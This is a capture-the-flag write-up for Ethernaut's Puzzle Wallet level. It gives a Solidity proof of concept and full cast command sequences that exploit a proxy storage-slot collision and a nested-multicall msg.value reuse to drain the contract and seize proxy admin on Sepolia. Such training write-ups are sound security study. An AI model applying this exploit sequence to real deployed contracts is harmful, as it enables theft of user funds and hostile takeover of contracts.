# Ethernaut Challenge 24 — Puzzle Wallet

## 🎯 Goal

Become the **admin of the proxy contract** by exploiting:

* **storage collisions**
* **delegatecall behavior**
* a **flawed multicall implementation**

---

## 🧠 Key Concepts

* Upgradeable proxy (EIP-1967)
* Storage slot collisions
* `delegatecall` context (same storage, same `msg.sender`, same `msg.value`)
* Nested `multicall` vulnerability

---

## 🔍 Initial Analysis

Instance:

```bash
PUZZLE_PROXY_SEPOLIA=0x8573cA54260a177c618A3B028fD02E0D904307cB
```

### Check admin

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "admin()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

```
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
```

### Check pendingAdmin

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "pendingAdmin()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

```
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
```

---

## 🧪 Local Test

Before interacting with Sepolia, I reproduced the exploit locally:

👉 [PuzzleProxyTest.t.sol](../../test/PuzzleProxyTest.t.sol)

This test simulates:

* proxy deployment
* storage collision behavior
* multicall vulnerability
* full admin takeover

---

### 🔍 Core Exploit (from the test)

The key insight is the **nested multicall**:

```solidity
bytes memory depositCalldata = abi.encodeCall(PuzzleWallet.deposit, ());

bytes;
innerMultiCalldata[0] = depositCalldata;

bytes;
outerMulticallData[0] = depositCalldata;
outerMulticallData[1] = abi.encodeCall(PuzzleWallet.multicall, (innerMultiCalldata));
outerMulticallData[2] = abi.encodeCall(
    PuzzleWallet.execute,
    (player, 0.002 ether, bytes(""))
);

wallet.multicall{value: 0.001 ether}(outerMulticallData);
```

### 🧠 Why this works

* `deposit()` is executed **twice**
* but only **0.001 ETH is sent once**
* due to `delegatecall`, both calls reuse the same `msg.value`

Result:

* internal balance = **0.002 ETH**
* real contract balance = **0.002 ETH**

Then:

```solidity
execute(player, 0.002 ether, "")
```

👉 drains the contract to zero

---

### 🔗 From Local Test → Sepolia

The local test allowed me to:

* understand the exploit safely
* validate the call sequence
* translate the logic into **raw calldata using `cast`**

---

## ⚠️ Step 2 — Storage Collision

### Slot 0

| Proxy        | Wallet |
| ------------ | ------ |
| pendingAdmin | owner  |

```bash
cast call $PUZZLE_PROXY_SEPOLIA "owner()(address)"
```

```
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
```

👉 `owner == pendingAdmin`

---

### Slot 1

| Proxy | Wallet     |
| ----- | ---------- |
| admin | maxBalance |

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "maxBalance()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

```
652733554269361572482625626281549340425241315364
```

Convert:

```bash
cast --to-hex 652733554269361572482625626281549340425241315364
```

```
0x725595ba16e76ed1f6cc1e1b65a88365cc494824
```

👉 same as admin

---

### 🧠 Insight

A storage slot is 32 bytes:

* interpreted as `address` → last 20 bytes
* interpreted as `uint256` → full value

👉 This allows us to **overwrite `admin` via `maxBalance`**

---

## 🚀 Step 3 — Become Owner

```bash
MY_ADDRESS=0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

We are not whitelisted:

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "whitelisted(address)(bool)" \
  $MY_ADDRESS
```

```
false
```

Exploit slot collision:

```bash
cast send $PUZZLE_PROXY_SEPOLIA \
  "proposeNewAdmin(address)" \
  $MY_ADDRESS \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

```bash
cast call $PUZZLE_PROXY_SEPOLIA "owner()(address)"
```

```
$MY_ADDRESS
```

👉 We are now the **owner**

---

## ✅ Step 4 — Whitelist Yourself

```bash
cast send $PUZZLE_PROXY_SEPOLIA \
  "addToWhitelist(address)" \
  $MY_ADDRESS \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

---

## 💣 Step 5 — Drain the Contract

Check balance:

```bash
cast balance $PUZZLE_PROXY_SEPOLIA --rpc-url $SEPOLIA_RPC_URL -e
```

```
0.001 ether
```

---

### 🧠 Vulnerability

```solidity
bool depositCalled = false;
```

This variable is **reset in nested multicalls**, allowing:

👉 multiple deposits using the same ETH

---

### ⚙️ Exploit via `cast`

```bash
DEPOSIT_CALL=$(cast calldata "deposit()")

INNER_MULTICALL_CALL=$(cast calldata "multicall(bytes[])" "[${DEPOSIT_CALL}]")

EXECUTE_CALL=$(cast calldata "execute(address,uint256,bytes)" \
  $MY_ADDRESS \
  2000000000000000 \
  0x)

cast send $PUZZLE_PROXY_SEPOLIA \
  "multicall(bytes[])" \
  "[${DEPOSIT_CALL},${INNER_MULTICALL_CALL},${EXECUTE_CALL}]" \
  --value 0.001ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

---

### ✅ Result

```bash
cast balance $PUZZLE_PROXY_SEPOLIA
```

```
0
```

---

## 🏁 Step 6 — Become Admin

```bash
cast send $PUZZLE_PROXY_SEPOLIA \
  "setMaxBalance(uint256)" \
  $(cast to-dec $MY_ADDRESS) \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

---

### ✅ Verify

```bash
cast call $PUZZLE_PROXY_SEPOLIA "admin()(address)"
```

```
$MY_ADDRESS
```

